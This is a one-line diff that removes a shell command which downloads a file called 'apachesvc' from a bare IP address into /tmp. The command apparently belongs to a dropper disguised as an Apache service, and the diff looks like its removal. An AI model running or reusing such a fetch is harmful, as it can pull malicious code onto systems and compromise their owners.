@@ -1,1 +1,0 @@
-curl http://103.202.153.183:8443/apachesvc -o /tmp/apachesvc
